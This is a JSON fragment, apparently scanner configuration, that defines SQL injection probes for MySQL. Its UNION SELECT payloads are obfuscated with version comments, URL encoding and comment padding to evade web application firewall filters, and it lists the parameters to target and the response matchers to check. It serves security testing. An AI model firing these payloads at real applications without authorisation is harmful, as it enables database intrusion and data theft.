    "waf_bypass": {
      "description": "WAF bypass SQL injection payloads — MySQL version comments, URL-encoded keywords from HackTricks",
      "tech_match": ["MySQL", "Apache", "PHP"],
      "param_match": ["id", "uid", "pid", "num", "page", "idx", "index", "cat", "item_id", "user_id", "order_id"],
      "probes": [
        {
          "payload": "{{baseline}}/*!50000UNION*//*!50000SELECT*/NULL-- -",
          "description": "MySQL conditional version comment bypass — inline comments hide UNION/SELECT from WAF keyword matching",
          "matchers": [
            {"type": "status", "status": [200]},
            {"type": "length_diff", "min_diff": 50}
          ],
          "severity": "high",
          "confidence_boost": 45,
          "variables": {}
        },
        {
          "payload": "{{baseline}}' %55NION %53ELECT NULL-- -",
          "description": "URL-encoded UNION SELECT (%55=U, %53=S) bypasses static keyword filters checking for literal strings",
          "matchers": [
            {"type": "status", "status": [200]},
            {"type": "length_diff", "min_diff": 50}
          ],
          "severity": "high",
          "confidence_boost": 40,
          "variables": {}
        },
        {
          "payload": "{{baseline}}'/**/UNION/**/SELECT/**/NULL-- -",
          "description": "Comment-padded UNION SELECT — C-style comments break keyword detection in many WAF implementations",
          "matchers": [
            {"type": "status", "status": [200]},
            {"type": "length_diff", "min_diff": 50}
          ],
          "severity": "high",
          "confidence_boost": 40,
